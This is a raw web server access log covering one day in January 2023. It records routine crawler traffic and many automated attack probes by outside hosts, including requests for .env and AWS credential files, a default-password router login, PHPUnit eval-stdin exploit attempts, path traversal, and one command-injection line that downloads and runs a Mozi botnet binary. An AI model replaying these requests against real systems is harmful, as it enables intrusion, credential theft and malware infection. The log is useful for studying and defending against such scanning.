197.39.248.146 - - [13/Jan/2023:00:40:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
223.240.101.111 - - [13/Jan/2023:00:49:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.224.128.100 - - [13/Jan/2023:01:03:55 -0600] "GET /admin/assets/js/views/login.js HTTP/1.0" 301 262 "-" "xfa1,nvdorz,nvd0rz"
40.77.167.41 - - [13/Jan/2023:01:05:15 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.57 - - [13/Jan/2023:01:05:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
205.185.118.237 - - [13/Jan/2023:01:13:10 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [13/Jan/2023:01:14:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.38.20.161 - - [13/Jan/2023:01:23:15 -0600] "GET /components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php HTTP/1.1" 301 322 "-" "ALittle Client"
31.220.1.83 - - [13/Jan/2023:01:53:37 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [13/Jan/2023:02:09:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [13/Jan/2023:02:25:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:02:25:07 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.44 - - [13/Jan/2023:02:34:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
4.17.224.134 - - [13/Jan/2023:02:53:35 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.17.224.134 - - [13/Jan/2023:02:53:35 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:03:10:16 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.105.161.142 - - [13/Jan/2023:03:17:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
194.180.49.233 - - [13/Jan/2023:03:32:27 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
194.180.49.233 - - [13/Jan/2023:03:32:32 -0600] "GET ../../proc/ HTTP" 400 226 "-" "-"
143.110.222.166 - - [13/Jan/2023:04:08:32 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
74.84.150.150 - - [13/Jan/2023:04:17:44 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "test"
92.118.39.29 - - [13/Jan/2023:04:29:52 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
31.220.1.83 - - [13/Jan/2023:04:45:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [13/Jan/2023:05:07:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [13/Jan/2023:05:25:42 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:05:25:43 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.209.162 - - [13/Jan/2023:05:58:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.209.162 - - [13/Jan/2023:05:58:23 -0600] "GET /showLogin.cc HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:06:08:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
34.76.158.233 - - [13/Jan/2023:06:17:29 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
92.118.39.29 - - [13/Jan/2023:06:22:09 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
93.170.171.211 - - [13/Jan/2023:06:37:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.185.118.237 - - [13/Jan/2023:06:44:33 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
80.94.92.57 - - [13/Jan/2023:06:51:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [13/Jan/2023:07:10:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.74.192.43 - - [13/Jan/2023:07:11:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
80.94.92.57 - - [13/Jan/2023:07:37:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.216.201.154 - - [13/Jan/2023:07:41:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0"
54.173.41.45 - - [13/Jan/2023:07:52:21 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/60.0.3102.105 Safari/537.32"
115.50.184.158 - - [13/Jan/2023:07:59:39 -0600] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 301 285 "-" "-"
143.110.222.166 - - [13/Jan/2023:08:12:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [13/Jan/2023:08:25:07 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:08:25:08 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.57 - - [13/Jan/2023:08:50:44 -0600] "\x16\x03\x01" 400 226 "-" "-"
45.79.181.179 - - [13/Jan/2023:08:52:51 -0600] "\x16\x03\x01" 400 226 "-" "-"
184.105.139.68 - - [13/Jan/2023:08:53:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
184.105.139.68 - - [13/Jan/2023:08:55:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
184.105.139.68 - - [13/Jan/2023:08:56:38 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"
107.170.232.15 - - [13/Jan/2023:09:00:28 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
143.110.222.166 - - [13/Jan/2023:09:05:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [13/Jan/2023:09:17:37 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.78.47.249 - - [13/Jan/2023:10:07:43 -0600] "GET /_ignition/health-check/ HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
147.78.47.249 - - [13/Jan/2023:10:07:45 -0600] "GET /public/_ignition/health-check/ HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
147.78.47.249 - - [13/Jan/2023:10:07:47 -0600] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:37 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:37 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [13/Jan/2023:10:11:38 -0600] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:38 -0600] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:38 -0600] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:38 -0600] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:39 -0600] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:39 -0600] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:39 -0600] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:40 -0600] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:40 -0600] "GET /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:40 -0600] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:41 -0600] "GET /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:41 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:41 -0600] "POST /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:41 -0600] "POST /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:42 -0600] "GET /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:42 -0600] "POST /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:42 -0600] "POST /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:43 -0600] "GET /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [13/Jan/2023:10:11:43 -0600] "POST /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:10:11:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [13/Jan/2023:10:15:56 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [13/Jan/2023:10:45:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.29 - - [13/Jan/2023:10:48:47 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
120.86.255.205 - - [13/Jan/2023:11:05:24 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 324 "-" "Hello, world"
185.254.196.223 - - [13/Jan/2023:11:25:13 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:11:25:14 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:12:11:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
80.94.92.57 - - [13/Jan/2023:12:54:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.106.168.55 - - [13/Jan/2023:12:59:55 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.106.168.55 - - [13/Jan/2023:12:59:55 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.106.168.55 - - [13/Jan/2023:12:59:57 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "python-requests/2.28.1"
54.183.244.163 - - [13/Jan/2023:13:01:05 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:13:10:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
202.73.34.226 - - [13/Jan/2023:13:41:41 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
202.73.34.226 - - [13/Jan/2023:13:41:42 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /about HTTP/1.1" 301 237 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /api/search?folderIds=0 HTTP/1.1" 301 254 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /config.json HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /debug/default/view?panel=config HTTP/1.1" 301 263 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /.DS_Store HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 307 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA616715) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3267.98 Mobile Safari/537.3"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /info.php HTTP/1.1" 301 240 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /login.action HTTP/1.1" 301 244 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 301 257 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /s/7393e2031323e2539313e2439313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 301 332 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /server-status HTTP/1.1" 301 245 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /telescope/requests HTTP/1.1" 301 250 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /v2/_catalog HTTP/1.1" 301 243 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "GET /.vscode/sftp.json HTTP/1.1" 301 249 "-" "Go-http-client/1.1"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "HELP" 400 226 "-" "-"
178.62.221.40 - - [13/Jan/2023:14:04:31 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [13/Jan/2023:14:10:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.1.248.42 - - [13/Jan/2023:14:20:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:14:20:25 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:14:25:32 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:14:25:33 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:14:26:35 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
43.153.10.221 - - [13/Jan/2023:14:31:06 -0600] "GET / HTTP/1.1" 301 232 "-" "curl/7.64.1"
152.89.196.211 - - [13/Jan/2023:14:36:20 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:09 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [13/Jan/2023:14:44:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:10 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.112 - - [13/Jan/2023:14:44:11 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:16 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:17 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.25 - - [13/Jan/2023:14:44:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.34.187 - - [13/Jan/2023:14:44:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.35.128 - - [13/Jan/2023:14:44:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.41.193 - - [13/Jan/2023:14:44:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.41.193 - - [13/Jan/2023:14:44:20 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
